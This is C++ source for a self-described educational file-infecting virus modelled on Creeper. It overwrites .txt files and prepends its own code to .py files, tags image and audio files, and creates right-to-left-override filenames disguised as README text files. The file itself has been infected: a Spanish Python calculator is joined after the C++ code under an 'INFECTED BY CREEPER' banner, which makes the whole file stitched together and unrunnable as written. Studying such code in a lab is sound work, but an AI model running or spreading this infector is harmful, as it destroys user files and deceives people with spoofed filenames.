/*
 * Creeper (1971) - Educational virus (C++ version)
 * Compile (MinGW): g++ creeper.cpp -o creeper.exe -std=c++17
 *
 * Uses C++17 std::filesystem for directory traversal.
 */

#include <iostream>
#include <fstream>
#include <filesystem>
#include <string>
#include <vector>
#include <ctime>
#include <cstring>

namespace fs = std::filesystem;

const std::string SELF_SOURCE = "creeper.cpp";
const std::string RTL = "\u202E";

int read_count = 0;
int infect_count = 0;
int rtl_count = 0;

std::string read_source() {
    std::ifstream f(SELF_SOURCE);
    if (!f) return "// source unavailable\n";
    return std::string((std::istreambuf_iterator<char>(f)),
                       std::istreambuf_iterator<char>());
}

void exfiltrate(const fs::path &path) {
    std::string name = path.filename().string();
    std::string ext = path.extension().string();
    std::transform(ext.begin(), ext.end(), ext.begin(), ::tolower);

    auto sz = fs::file_size(path);

    if (ext == ".txt") {
        std::ifstream f(path);
        int lines = 0; std::string line;
        while (std::getline(f, line)) lines++;
        std::cout << "[creep] reading: " << name << " (exfiltrated " << sz << " bytes, " << lines << " lines)\n";
    } else if (ext == ".csv") {
        std::ifstream f(path);
        int rows = 0; std::string line;
        while (std::getline(f, line)) rows++;
        std::cout << "[creep] reading: " << name << " (parsed " << rows << " rows)\n";
    } else if (ext == ".html") {
        std::ifstream f(path);
        int tags = 0; char c;
        while (f.get(c)) if (c == '<') tags++;
        std::cout << "[creep] reading: " << name << " (found " << tags << " HTML tags)\n";
    } else if (ext == ".md") {
        std::ifstream f(path);
        int headers = 0; std::string line;
        while (std::getline(f, line)) if (!line.empty() && line[0] == '#') headers++;
        std::cout << "[creep] reading: " << name << " (found " << headers << " headers)\n";
    } else if (ext == ".py") {
        std::ifstream f(path);
        int lines = 0; std::string line;
        while (std::getline(f, line)) lines++;
        std::cout << "[creep] reading: " << name << " (script, " << lines << " lines)\n";
    } else if (ext == ".png" || ext == ".jpg" || ext == ".jpeg" || ext == ".mp3") {
        std::cout << "[creep] reading: " << name << " (" << sz << " bytes, binary)\n";
    } else if (ext == ".docx" || ext == ".xlsx" || ext == ".pptx") {
        std::cout << "[creep] reading: " << name << " (office document, " << sz << " bytes)\n";
    } else {
        return;
    }
    read_count++;
}

bool infect_file(const fs::path &path, const std::string &code) {
    std::string name = path.filename().string();
    std::string ext = path.extension().string();
    std::transform(ext.begin(), ext.end(), ext.begin(), ::tolower);

    if (name.rfind("README", 0) == 0 || name.find(RTL) != std::string::npos) return false;
    if (name == SELF_SOURCE) return false;
    if (name.find(".exe") != std::string::npos || name.find(".go") != std::string::npos ||
        name.find(".nim") != std::string::npos || name.find(".c") != std::string::npos ||
        name.find(".cpp") != std::string::npos || name == "setup_lab.py") return false;

    if (ext == ".py") {
        std::ifstream in(path);
        std::string orig((std::istreambuf_iterator<char>(in)),
                          std::istreambuf_iterator<char>());
        std::ofstream out(path);
        out << code << "\n# === INFECTED BY CREEPER ===\n" << orig;
        std::cout << "[creep] infected: " << name << " (prepended virus code)\n";
        return true;
    } else if (ext == ".txt") {
        std::ofstream out(path);
        out << code;
        std::cout << "[creep] infected: " << name << " (overwritten with virus)\n";
        return true;
    }
    return false;
}

bool infect_binary(const fs::path &path) {
    std::string name = path.filename().string();
    std::string ext = path.extension().string();
    std::transform(ext.begin(), ext.end(), ext.begin(), ::tolower);

    if (name.find(RTL) != std::string::npos || name == SELF_SOURCE) return false;

    std::string marker = "\n[CREEPER-INFECTED]\nTimestamp: " +
                         std::to_string(std::time(nullptr)) + "\n";

    std::ifstream in(path, std::ios::binary);
    std::vector<char> data((std::istreambuf_iterator<char>(in)),
                            std::istreambuf_iterator<char>());
    std::string data_str(data.begin(), data.end());
    if (data_str.find("[CREEPER-INFECTED]") != std::string::npos) return false;

    if (ext == ".png") {
        auto pos = data_str.rfind("IEND");
        if (pos != std::string::npos) {
            pos += 8;
            std::vector<char> new_data(data.begin(), data.begin() + pos);
            new_data.insert(new_data.end(), marker.begin(), marker.end());
            new_data.insert(new_data.end(), data.begin() + pos, data.end());
            std::ofstream out(path, std::ios::binary);
            out.write(new_data.data(), new_data.size());
            std::cout << "[creep] infected: " << name << " (appended marker after IEND)\n";
            return true;
        }
    } else if (ext == ".jpg" || ext == ".jpeg") {
        if (data.size() >= 2 &&
            (unsigned char)data[data.size()-2] == 0xFF &&
            (unsigned char)data[data.size()-1] == 0xD9) {
            data.resize(data.size() - 2);
            data.insert(data.end(), marker.begin(), marker.end());
            data.push_back(0xFF);
            data.push_back(0xD9);
            std::ofstream out(path, std::ios::binary);
            out.write(data.data(), data.size());
            std::cout << "[creep] infected: " << name << " (appended marker before EOI)\n";
            return true;
        }
    } else if (ext == ".mp3") {
        std::ofstream out(path, std::ios::binary | std::ios::app);
        out << marker;
        std::cout << "[creep] infected: " << name << " (appended marker)\n";
        return true;
    }
    return false;
}

int spawn_rtl(const std::string &code) {
    int count = 0;
    for (int i = 0; i < 3; i++) {
        std::string name = "README" + std::to_string(i) + RTL + "txt.py";
        if (!fs::exists(name)) {
            std::ofstream out(name);
            out << code;
            std::cout << "[creep] RTL-spawned: " << name << "\n";
            std::cout << "        (looks like README" << i << ".txt in Explorer)\n";
            count++;
        }
    }
    return count;
}

void write_log() {
    std::ofstream log("infection.log");
    log << "=== CREEPER VIRUS - INFECTION LOG ===\n";
    log << "Execution: " << std::time(nullptr) << "\n";
    log << "Source: " << SELF_SOURCE << "\n\n";
    log << "Files read: " << read_count << "\n";
    log << "Files infected: " << infect_count << "\n";
    log << "  - regular:  " << (infect_count - rtl_count) << "\n";
    log << "  - RTL clones: " << rtl_count << "\n";
    log << "======================================\n";
}

int main() {
    std::cout << "I'M THE CREEPER: CATCH ME IF YOU CAN.\n\n";

    std::string code = read_source();
    std::vector<fs::directory_entry> entries;

    for (auto &e : fs::directory_iterator(".")) {
        if (e.is_regular_file()) entries.push_back(e);
    }

    // 1. READ
    for (auto &e : entries) {
        std::string name = e.path().filename().string();
        if (name == SELF_SOURCE || name == "setup_lab.py" || name.rfind("README", 0) == 0)
            continue;
        exfiltrate(e.path());
    }

    // 2. INFECT
    for (auto &e : entries) {
        std::string name = e.path().filename().string();
        if (name == SELF_SOURCE || name == "setup_lab.py") continue;
        std::string ext = e.path().extension().string();
        std::transform(ext.begin(), ext.end(), ext.begin(), ::tolower);

        if (ext == ".py" || ext == ".txt") {
            if (infect_file(e.path(), code)) infect_count++;
        } else if (ext == ".png" || ext == ".jpg" || ext == ".jpeg" || ext == ".mp3") {
            if (infect_binary(e.path())) infect_count++;
        }
    }

    // 3. RTL
    rtl_count = spawn_rtl(code);
    infect_count += rtl_count;

    // 4. Log
    write_log();

    // 5. Report
    std::cout << "\n[creep] activity logged to: infection.log\n";
    std::cout << "[creep] files read:     " << read_count << "\n";
    std::cout << "[creep] files infected: " << infect_count << "\n";
    std::cout << "[creep]   - regular:  " << (infect_count - rtl_count) << "\n";
    std::cout << "[creep]   - RTL clones: " << rtl_count << "\n";
    std::cout << "[creep] use antivirus to remove me\n";

    return 0;
}

# === INFECTED BY CREEPER ===
#!/usr/bin/env python3
"""Calculadora simple - Herramienta de usuario legitima"""
import sys

def suma(a, b): return a + b
def resta(a, b): return a - b
def mult(a, b): return a * b
def div(a, b): return a / b if b != 0 else float('inf')

OP = {'+': suma, '-': resta, '*': mult, '/': div}

def main():
    print("=== CALCULADORA v1.0 ===")
    print("Operaciones: +, -, *, /")
    while True:
        try:
            cmd = input(">>> ").strip()
            if cmd.lower() in ('exit', 'quit', 'q'):
                break
            partes = cmd.split()
            if len(partes) != 3:
                print("Formato: a + b")
                continue
            a, op, b = float(partes[0]), partes[1], float(partes[2])
            if op in OP:
                print(f"= {OP[op](a, b)}")
            else:
                print(f"Operacion '{op}' no soportada")
        except Exception as e:
            print(f"Error: {e}")

if __name__ == "__main__":
    main()
